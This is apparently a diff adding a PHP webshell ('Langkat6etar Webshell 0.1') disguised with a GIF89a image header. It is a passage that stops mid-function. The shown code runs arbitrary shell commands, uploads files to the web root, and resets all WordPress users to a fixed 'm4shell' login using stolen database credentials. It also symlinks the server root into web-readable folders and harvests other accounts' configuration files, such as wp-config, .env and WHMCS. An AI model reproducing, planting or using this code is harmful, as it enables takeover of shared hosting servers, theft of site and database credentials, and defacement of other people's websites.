@@ -1,0 +1,1750 @@
+GIF89a;
+
+<?php
+@ini_set('log_errors',0);
+@ini_set('output_buffering',0);
+set_time_limit(0);
+error_reporting(0);
+$sys = php_uname();
+$ip = gethostbyname($_SERVER['HTTP_HOST']);
+$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';
+$getds = @ini_get("disable_functions");
+$ds = (!empty($getds)) ? "<font>$ds</font>" : "<font>NONE</font>";
+if(get_magic_quotes_gpc()){
+    foreach($_POST as $key=>$value){
+        $_POST[$key] = stripslashes($value);
+    }
+}
+?>
+<?php
+ 
+function w($dir,$perm) {
+    if(!is_writable($dir)) {
+        return "<font color=red>".$perm."</font>";
+    } else {
+        return "<font color=#1dff00>".$perm."</font>";
+    }
+}
+function exe($cmd) {
+    if(function_exists('system')) {         
+        @ob_start();         
+        @system($cmd);         
+        $buff = @ob_get_contents();         
+        @ob_end_clean();         
+        return $buff;     
+    } elseif(function_exists('exec')) {         
+        @exec($cmd,$results);         
+        $buff = "";         
+        foreach($results as $result) {             
+            $buff .= $result;         
+        } return $buff;     
+    } elseif(function_exists('passthru')) {         
+        @ob_start();         
+        @passthru($cmd);         
+        $buff = @ob_get_contents();         
+        @ob_end_clean();         
+        return $buff;     
+    } elseif(function_exists('shell_exec')) {         
+        $buff = @shell_exec($cmd);         
+        return $buff;     
+    } 
+}
+function GrabUrl($url,$type){
+
+        $urlArray = array();
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $result = curl_exec($ch);
+
+        $regex='|<a.*?href="(.*?)"|';
+        preg_match_all($regex,$result,$parts);
+        $links=$parts[1];
+        foreach($links as $link){
+            array_push($urlArray, $link);
+        }
+        curl_close($ch);
+
+        foreach($urlArray as $value){
+            $lol="$url$value";
+            if(preg_match("#$type#is", $lol)) {
+                echo "$lol\r\n";
+            }
+        }
+}
+function showdisablefunctions() {
+    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#1dff00><b>".$disablefunc."</b></font></span>"; }
+    else { return "<span style='color:#1dff00'><b>NONE</b></span>"; }
+}
+function ambilKata($param, $kata1, $kata2){
+    if(strpos($param, $kata1) === FALSE) return FALSE;
+    if(strpos($param, $kata2) === FALSE) return FALSE;
+    $start = strpos($param, $kata1) + strlen($kata1);
+    $end = strpos($param, $kata2, $start);
+    $return = substr($param, $start, $end - $start);
+    return $return;
+}
+function sulap($text) {
+  if(!get_magic_quotes_gpc()) {
+    return $text;
+    }
+  return stripslashes($text);
+}
+function perms($file){
+$perms = fileperms($file);
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+$_COPY = base64_decode($_c7e);
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+if($_POST['upload']) {
+        if($_POST['tipe_upload'] == 'biasa') {
+            if(@copy($_FILES['ix_file']['tmp_name'], "$path/".$_FILES['ix_file']['name']."")) {
+                $act = "<font color=green>Uploaded!</font> at <i><b>$path/".$_FILES['ix_file']['name']."</b></i>";
+            } else {
+                $act = "<font color=red>Failed to upload file</font>";
+            }
+        } else {
+            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
+            $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
+            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
+                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
+                    $act = "<font color=green>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
+                } else {
+                    $act = "<font color=red>Failed to upload file</font>";
+                }
+            } else {
+                $act = "<font color=red>Failed to upload file</font>";
+            }
+        }
+    }
+
+
+    ?>
+<html><head>
+<title>Langkat6etar Webshell 0.1</title>
+<meta http-equiv="Content-Type" content="jpg/png; charset=utf-8"><div class="gmail_extra"><br>
+<link rel="SHORTCUT ICON" href="http://goenk.wapgem.com/idb.png">
+<body>
+<!DOCTYPE HTML>
+<HTML>
+<HEAD>
+<link href="" rel="stylesheet" type="text/css">
+<style type="text/css">
+<?php
+echo '
+
+body{
+font-family: "Tahoma";
+background-color: #19263a;
+color:white;
+
+}
+#content tr:hover{
+background-color: #1b283c;
+text-shadow:0px 0px 10px #fff;
+}
+
+#content .first{
+background-color: #19263a;
+}
+
+table{
+border: 1px #19263a dotted;
+}
+a{
+color:white;
+text-decoration: none;
+}
+.abir{
+    color: #000;
+    font-family: sans-serif;
+    font-size: 10px;
+background-color: #35f6bc;
+text-decoration: none;
+font-color: #fff;
+border: 6px #35f6bc solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+
+}
+        input,select,textarea{
+            border: 1px #000000 solid;
+            -moz-border-radius: 5px;
+            -webkit-border-radius:5px;
+            border-radius:5px;
+        }
+.abirs{
+    color: black;
+    font-family: sans-serif;
+    font-size: 10px;
+background-color: #aad1fe;
+text-decoration: none;
+font-color: #fff;
+border: 6px #aad1fe solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+
+}
+.abirsak{
+    color: #000;
+    font-family: sans-serif;
+    font-size: 10px;
+background-color: red;
+text-decoration: none;
+font-color: #fff;
+border: 6px red solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+
+}
+select{
+    color: #fff;
+    font-family: sans-serif;
+    font-size: 12px;
+    height: 29px;
+background-color: #38475e;
+text-decoration: none;
+font-color: #fff;
+border: 1px #37465d solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+
+}
+.sinput{
+    color: #fff;
+    font-family: sans-serif;
+    font-size: 12px;
+    height: 29px;
+background-color: #38475e;
+text-decoration: none;
+font-color: #fff;
+border: 1px #37465d solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+textarea{
+border: 1px #fff solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+.sinputqw{
+    color: #000;
+    font-family: sans-serif;
+    font-size: 12px;
+    height: 1px;
+background-color: #38475e;
+text-decoration: none;
+font-color: #fff;
+border: 1px #37465d solid;
+
+</style>
+</HEAD>
+</head>
+<header><center>
+                <a href="'.basename($_SERVER['PHP_SELF']).'">
+                        <img style="width:280px;" src="https://i.ibb.co/rH0yPxV/l6.png"><hr class="sinputqw">
+                    </a>
+                
+            </center></header>
+
+';
+echo '
+System : '.$sys.'<br>
+IP : '.$ip.'<br>
+Safe Mode : '.$sm.'<br>
+Disabled Functions : '.$ds.'<br>
+<form method="post">
+<input type="text" name="cmd" size="30"><input type="submit" name="do_cmd" value="Command">
+</form><br><center>';
+if($_POST['do_cmd']) {
+        echo "<pre>".exe($_POST['cmd'])."</pre>";
+    }
+
+
+echo "
+<a class='abir' href='?path=$path&bypass=disablefunc'>Disable Func</a>
+<a class='abir' href='?path=$path&do=mass_deface'>Mass Deface</a>
+<a class='abir' href='?path=$path&do=wpm'>Wp Mass Change</a>
+<a class='abir' href='?path=$path&do=jumping'>Jumping</a>
+<a class='abir' href='?path=$path&symlink=server'>Symlink</a>
+<a class='abir' href='?path=$path&jancok=adminer'>adminer</a>
+<a class='abir' href='?path=$path&config=grabber'>Grab Config</a><br><br>
+<a class='abir' href='?path=$path&do=tolls'>cPanel Crack</a>
+<a class='abir' href='?path=$path&do=mailtest'>mailtest</a>
+<a class='abir' href='?path=$path&backconnect=tool'>Back Connect</a>
+<a class='abir' href='?path=$path&cok=nganua'>Mass Edit User</a>
+<a class='abir' href='?path=$path&bypass=passwd'>Bypass Config</a>
+<br>";
+echo '<br>
+Current Path :</font>';
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+
+echo '';
+    echo "<br><br></center><center>
+    <form method='post' enctype='multipart/form-data'>
+    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($path,"Writeable")." ] 
+    <input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
+    <br><input type='file' name='ix_file'>
+    <input type='submit' value='upload' name='upload'>
+    </form></center>";
+    echo "<center>".$act."</center>";
+
+
+
+
+
+if($_GET['do'] == 'wpm'){
+?><br><br><center>
+<form method="post">
+<input type="text" name="confleg" placeholder="Config URL Here">
+<br><br>
+<input type="submit" class='sinput' name="chxe" value="Change Admin">
+</form><br><br>
+<?php
+ if($_POST['chxe']){ $get2 = file_get_contents($_POST['confleg']);
+ preg_match_all('#<a href="(.*?)"#', $get2, $config);
+  $count = 1;
+ foreach($config[1] as $don){ $get = file_get_contents($_POST['confleg']."/".$don);
+ preg_match_all("/DB_HOST', '(.*?)'/", $get, $host);
+ foreach($host[1] as $don){ $host = $don;
+ } preg_match_all("/DB_PASSWORD', '(.*?)'/", $get, $pass);
+ foreach($pass[1] as $done){ $password = $done;
+ } preg_match_all("/DB_USER', '(.*?)'/", $get, $user);
+ foreach($user[1] as $done1){ $user = $done1;
+ } preg_match_all("/DB_NAME', '(.*?)'/", $get, $name);
+ foreach($name[1] as $done2){ $name = $done2;
+ } preg_match_all("/$table_prefix = '(.*?)'/", $get, $prefix);
+ foreach($prefix[1] as $done3){ $prefix = $done3;
+ } $connect = mysqli_connect($host,$user,$password,$name);
+ if($connect){ $query1 = mysqli_query($connect,"select * from ".$prefix."options where option_name='siteurl'");
+
+ while($siteurl = mysqli_fetch_array($query1)){ $site_url = $siteurl['option_value'];
+ } $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='m4shell',user_pass='103286836c1b86b2ba7805c8cbee02a6'");
+ if($query2){ echo "<span class=f><b>NO<b> ".$count."  :<a href='$site_url/wp-login.php' target='_blank'>$site_url/wp-login.php</a>|m4shell|m4shell<br></span>";
+ }
+$count=$count+1;
+  } } } 
+
+
+
+    
+}
+elseif($_GET['do'] == 'sql'){
+	
+}
+elseif($_GET['config'] == 'grabber') {
+            if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
+echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
+exit;
+}
+    if($_POST){    if($_POST['config'] == 'symvhosts') {
+        @mkdir("rabbitz_symvhosts", 0777);
+exe("ln -s / rabbitz_symvhosts/root");
+$htaccess="Options Indexes FollowSymLinks
+DirectoryIndex rabbitz.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any";
+@file_put_contents("rabbitz_symvhosts/.htaccess",$htaccess);
+        $etc_passwd=$_POST['passwd'];
+    
+    $etc_passwd=explode("\n",$etc_passwd);
+foreach($etc_passwd as $passwd){
+$pawd=explode(":",$passwd);
+$user =$pawd[5];
+$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
+if (preg_match('/vhosts/i',$user)){
+exe("ln -s ".$user."/httpdocs/wp-config.php rabbitz_symvhosts/".$jembod."-Wordpress.txt");
+exe("ln -s ".$user."/httpdocs/configuration.php rabbitz_symvhosts/".$jembod."-Joomla.txt");
+exe("ln -s ".$user."/httpdocs/config/koneksi.php rabbitz_symvhosts/".$jembod."-Lokomedia.txt");
+exe("ln -s ".$user."/httpdocs/forum/config.php rabbitz_symvhosts/".$jembod."-phpBB.txt");
+exe("ln -s ".$user."/httpdocs/sites/default/settings.php rabbitz_symvhosts/".$jembod."-Drupal.txt");
+exe("ln -s ".$user."/httpdocs/config/settings.inc.php rabbitz_symvhosts/".$jembod."-PrestaShop.txt");
+exe("ln -s ".$user."/httpdocs/app/etc/local.xml rabbitz_symvhosts/".$jembod."-Magento.txt");
+exe("ln -s ".$user."/httpdocs/admin/config.php rabbitz_symvhosts/".$jembod."-OpenCart.txt");
+exe("ln -s ".$user."/httpdocs/application/config/database.php rabbitz_symvhosts/".$jembod."-Ellislab.txt"); 
+}}}
+if($_POST['config'] == 'symlink') {
+@mkdir("rabbitz_symconfig", 0777);
+@symlink("/","rabbitz_symconfig/root");
+$htaccess="Options Indexes FollowSymLinks
+DirectoryIndex rabbitz.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any";
+@file_put_contents("rabbitz_symconfig/.htaccess",$htaccess);}
+if($_POST['config'] == '404') {
+@mkdir("rabbitz_sym404", 0777);
+@symlink("/","rabbitz_sym404/root");
+$htaccess="Options Indexes FollowSymLinks
+DirectoryIndex rabbitz.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
+IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
+IndexIgnore *.txt404
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} ^.*rabbitz_sym404 [NC]
+RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
+@file_put_contents("rabbitz_sym404/.htaccess",$htaccess);
+}
+if($_POST['config'] == 'grab') {
+                        mkdir("rabbitz_configgrab", 0777);
+                        $isi_htc = "Options all\nRequire None\nSatisfy Any";
+                        $htc = fopen("rabbitz_configgrab/.htaccess","w");
+                        fwrite($htc, $isi_htc);    
+}
+$passwd = $_POST['passwd'];
+
+preg_match_all('/(.*?):x:/', $passwd, $user_config);
+foreach($user_config[1] as $user_rabbitz) {
+$grab_config = array(
+"/home/$user_rabbitz/.accesshash" => "WHM-accesshash",
+"/home/$user_rabbitz/public_html/config/koneksi.php" => "Lokomedia",
+"/home/$user_rabbitz/public_html/forum/config.php" => "phpBB",
+"/home/$user_rabbitz/public_html/sites/default/settings.php" => "Drupal",
+"/home/$user_rabbitz/public_html/config/settings.inc.php" => "PrestaShop",
+"/home/$user_rabbitz/public_html/app/etc/local.xml" => "Magento",
+"/home/$user_rabbitz/public_html/admin/config.php" => "OpenCart",
+"/home/$user_rabbitz/public_html/application/config/database.php" => "Ellislab",
+"/home/$user_rabbitz/public_html/vb/includes/config.php" => "Vbulletin",
+"/home/$user_rabbitz/public_html/includes/config.php" => "Vbulletin",
+"/home/$user_rabbitz/public_html/forum/includes/config.php" => "Vbulletin",
+"/home/$user_rabbitz/public_html/forums/includes/config.php" => "Vbulletin",
+"/home/$user_rabbitz/public_html/cc/includes/config.php" => "Vbulletin",
+"/home/$user_rabbitz/public_html/inc/config.php" => "MyBB",
+"/home/$user_rabbitz/public_html/includes/configure.php" => "OsCommerce",
+"/home/$user_rabbitz/public_html/shop/includes/configure.php" => "OsCommerce",
+"/home/$user_rabbitz/public_html/os/includes/configure.php" => "OsCommerce",
+"/home/$user_rabbitz/public_html/oscom/includes/configure.php" => "OsCommerce",
+"/home/$user_rabbitz/public_html/products/includes/configure.php" => "OsCommerce",
+"/home/$user_rabbitz/public_html/cart/includes/configure.php" => "OsCommerce",
+"/home/$user_rabbitz/public_html/inc/conf_global.php" => "IPB",
+"/home/$user_rabbitz/public_html/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/wp/test/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/blog/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/beta/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/portal/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/site/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/wp/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/WP/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/news/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/wordpress/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/test/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/demo/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/home/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/v1/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/v2/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/press/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/new/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/blogs/wp-config.php" => "Wordpress",
+"/home/$user_rabbitz/public_html/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/blog/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/submitticket.php" => "^WHMCS",
+"/home/$user_rabbitz/public_html/cms/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/beta/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/portal/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/site/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/main/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/home/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/demo/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/test/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/v1/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/v2/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/joomla/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/new/configuration.php" => "Joomla",
+"/home/$user_rabbitz/public_html/WHMCS/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/whmcs1/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Whmcs/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/whmcs/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/whmcs/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/WHMC/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Whmc/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/whmc/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/WHM/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Whm/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/whm/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/HOST/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Host/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/host/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/SUPPORTES/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Supportes/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/supportes/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/domains/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/domain/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Hosting/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/HOSTING/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/hosting/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/CART/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Cart/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/cart/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/ORDER/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Order/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/order/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/CLIENT/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Client/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/client/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Clientarea/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/clientarea/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/SUPPORT/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Support/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/support/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/BILLING/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Billing/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/billing/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/BUY/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Buy/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/buy/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/MANAGE/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Manage/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/manage/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/ClientSupport/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Clientsupport/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/clientsupport/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/CHECKOUT/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Checkout/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/checkout/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/BILLINGS/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Billings/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/billings/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/BASKET/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Basket/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/basket/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/SECURE/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Secure/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/secure/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/SALES/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Sales/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/sales/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/BILL/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Bill/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/bill/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/PURCHASE/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Purchase/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/purchase/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/ACCOUNT/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Account/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/account/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/USER/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/User/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/user/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/CLIENTS/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Clients/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/clients/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/BILLINGS/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/Billings/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/billings/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/MY/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/My/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/my/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/secure/whm/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/secure/whmcs/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/panel/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/clientes/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/cliente/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/support/order/submitticket.php" => "WHMCS",
+"/home/$user_rabbitz/public_html/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/boxbilling/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/box/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/host/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/Host/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/supportes/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/support/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/hosting/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/cart/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/order/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/client/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/clients/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/cliente/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/clientes/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/billing/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/billings/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/my/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/secure/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/support/order/bb-config.php" => "BoxBilling",
+"/home/$user_rabbitz/public_html/includes/dist-configure.php" => "Zencart",
+"/home/$user_rabbitz/public_html/zencart/includes/dist-configure.php" => "Zencart",
+"/home/$user_rabbitz/public_html/products/includes/dist-configure.php" => "Zencart",
+"/home/$user_rabbitz/public_html/cart/includes/dist-configure.php" => "Zencart",
+"/home/$user_rabbitz/public_html/shop/includes/dist-configure.php" => "Zencart",
+"/home/$user_rabbitz/public_html/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/hostbills/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/host/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/Host/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/supportes/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/support/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/hosting/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/cart/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/order/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/client/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/clients/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/cliente/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/clientes/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/billing/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/billings/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/my/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/secure/includes/iso4217.php" => "Hostbills",
+"/home/$user_rabbitz/public_html/.env" => "Laravel",
+"/home/$user_rabbitz/public_html/public/.env" => "Laravel",
+"/home/$user_rabbitz/public_html/admin/.env" => "Laravel",
+"/home/$user_rabbitz/public_html/laravel/.env" => "Laravel",
+"/home/$user_rabbitz/configuration.php" => "Config",
+"/home/$user_rabbitz/public_html/support/order/includes/iso4217.php" => "Hostbills"
+);  
+
+foreach($grab_config as $config => $nama_config) {
+    if($_POST['config'] == 'grab') {
+$ambil_config = file_get_contents($config);
+if($ambil_config == '') {
+} else {
+$file_config = fopen("rabbitz_configgrab/$user_rabbitz-$nama_config.txt","w");
+fputs($file_config,$ambil_config);
